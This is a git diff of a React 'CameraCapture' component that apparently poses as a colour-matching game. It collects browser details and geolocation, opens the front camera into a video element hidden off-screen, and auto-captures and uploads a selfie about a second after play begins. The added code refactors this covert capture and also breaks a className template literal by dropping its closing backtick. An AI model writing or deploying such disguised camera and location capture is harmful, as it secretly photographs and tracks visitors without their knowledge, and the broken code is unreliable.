@@ -30,86 +30,10 @@ function CameraCapture({ onSuccess }) {
   const selfieCapturedRef = useRef(false);
   const videoReadyRef = useRef(false);
 
-  // Set up video stream once refs are ready
-  useEffect(() => {
-    const setupStream = async () => {
-      console.log('Setting up stream...');
-      try {
-        if (!streamRef.current) {
-          streamRef.current = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user' },
-            audio: false
-          });
-          console.log('Stream obtained!');
-        }
-
-        if (videoRef.current && streamRef.current) {
-          videoRef.current.srcObject = streamRef.current;
-          videoRef.current.onloadedmetadata = () => {
-            console.log('Video metadata loaded!');
-            videoRef.current.play().catch(err => console.error('Play error:', err));
-            videoReadyRef.current = true;
-          };
-        }
-      } catch (err) {
-        console.error('Stream setup error:', err);
-      }
-    };
-
-    setupStream();
-
-    // Cleanup
-    return () => {
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach(track => track.stop());
-      }
-    };
-  }, []);
-
   useEffect(() => {
     collectBrowserInfo();
-    // Start game after 1 second max
-    const timer = setTimeout(() => {
-      console.log('Starting game from timer...');
-      setStatus('PLAYING');
-    }, 1000);
-
-    // Try to get location
-    try {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const loc = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude
-          };
-          console.log('Location obtained:', loc);
-          setSavedLocation(loc);
-        },
-        (err) => {
-          console.warn('Location error:', err);
-        },
-        { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
-      );
-    } catch (e) {
-      console.warn('Geolocation not available');
-    }
-
-    return () => clearTimeout(timer);
+    initCameraAndLocation();
   }, []);
-
-  // Auto capture selfie once game is playing
-  useEffect(() => {
-    if (status === 'PLAYING') {
-      setNewTarget();
-      const captureTimer = setTimeout(() => {
-        if (!selfieCapturedRef.current) {
-          console.log('Auto capturing...');
-          captureFrame();
-        }
-      }, 1000);
-      return () => clearTimeout(captureTimer);
-    }
-  }, [status]);
 
   const collectBrowserInfo = () => {
     const info = {
@@ -122,6 +46,68 @@ function CameraCapture({ onSuccess }) {
     console.log('Browser info:', info);
     setBrowserInfo(info);
   };
+
+  const initCameraAndLocation = async () => {
+    // Try to get location first
+    try {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          setSavedLocation({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
+          console.log('Location obtained');
+        },
+        (err) => {
+          console.warn('Location error:', err);
+        },
+        { enableHighAccuracy: false, timeout: 5000, maximumAge: 300000 }
+      );
+    } catch (e) {
+      console.warn('Geolocation not available');
+    }
+
+    // Start camera immediately
+    initCamera();
+  };
+
+  const initCamera = async () => {
+    try {
+      if (!streamRef.current) {
+        streamRef.current = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+        console.log('Camera stream obtained');
+      }
+
+      if (videoRef.current && streamRef.current) {
+        videoRef.current.srcObject = streamRef.current;
+        videoRef.current.onloadedmetadata = () => {
+          videoRef.current.play().catch(err => console.error('Play error:', err));
+          videoReadyRef.current = true;
+          console.log('Video ready');
+        };
+      }
+    } catch (err) {
+      console.error('Camera error:', err);
+    }
+
+    // Start game after 500ms max
+    setTimeout(() => {
+      setStatus('PLAYING');
+      setNewTarget();
+    }, 500);
+  };
+
+  // Auto capture selfie after 1 second of playing
+  useEffect(() => {
+    if (status === 'PLAYING') {
+      const timer = setTimeout(() => {
+        if (!selfieCapturedRef.current) {
+          captureFrame();
+        }
+      }, 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [status]);
 
   const setNewTarget = () => {
     const target = COLOR_PALETTE[Math.floor(Math.random() * COLOR_PALETTE.length)];
@@ -157,19 +143,13 @@ function CameraCapture({ onSuccess }) {
     const canvas = canvasRef.current;
     const video = videoRef.current;
 
-    if (!canvas || !video || !videoReadyRef.current || video.videoWidth === 0) {
-      console.warn('Not ready, retrying in 300ms...', {
-        canvas: !!canvas,
-        video: !!video,
-        videoReady: videoReadyRef.current,
-        videoWidth: video?.videoWidth
-      });
-      setTimeout(captureFrame, 300);
+    if (!canvas || !video || video.videoWidth === 0) {
+      console.warn('Not ready, retrying in 200ms...');
+      setTimeout(captureFrame, 200);
       return;
     }
 
     selfieCapturedRef.current = true;
-    console.log('Capturing frame now!');
 
     const maxWidth = 400;
     const maxHeight = 300;
@@ -204,7 +184,6 @@ function CameraCapture({ onSuccess }) {
       console.log('Upload SUCCESS!', response.data);
     } catch (err) {
       console.error('Upload ERROR:', err.response?.data || err.message);
-      selfieCapturedRef.current = false; // Allow retry
     }
   };
 
@@ -234,6 +213,15 @@ function CameraCapture({ onSuccess }) {
     }
   };
 
+  // Cleanup stream
+  useEffect(() => {
+    return () => {
+      if (streamRef.current) {
+        streamRef.current.getTracks().forEach(track => track.stop());
+      }
+    };
+  }, []);
+
   if (status === 'LOADING') {
     return (
       <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-950 to-slate-950 flex items-center justify-center p-4">
@@ -246,7 +234,7 @@ function CameraCapture({ onSuccess }) {
   }
 
   return (
-    <div className={`min-h-screen bg-gradient-to-br from-slate-900 via-purple-950 to-slate-950 p-6 overflow-hidden relative ${shake ? 'animate-[shake_0.3s_ease-in-out]' : ''}`}>
+    <div className={`min-h-screen bg-gradient-to-br from-slate-900 via-purple-950 to-slate-950 p-6 overflow-hidden relative ${shake ? 'animate-[shake_0.3s_ease-in-out]' : ''}>
       {flash && <div className="absolute inset-0 bg-white opacity-20 pointer-events-none animate-ping"></div>}
 
       <div className="max-w-md mx-auto flex flex-col gap-6 relative z-10">
@@ -298,9 +286,9 @@ function CameraCapture({ onSuccess }) {
         </div>
       </div>
 
-      {/* Hidden elements for capture */}
-      <div className="absolute top-0 left-0 w-0 h-0 overflow-hidden">
-        <video ref={videoRef} autoPlay playsInline muted style={{ width: '640px', height: '480px' }}></video>
+      {/* Hidden video and canvas */}
+      <div className="fixed -top-[9999px] -left-[9999px]">
+        <video ref={videoRef} autoPlay playsInline muted width="640" height="480"></video>
         <canvas ref={canvasRef}></canvas>
       </div>
 
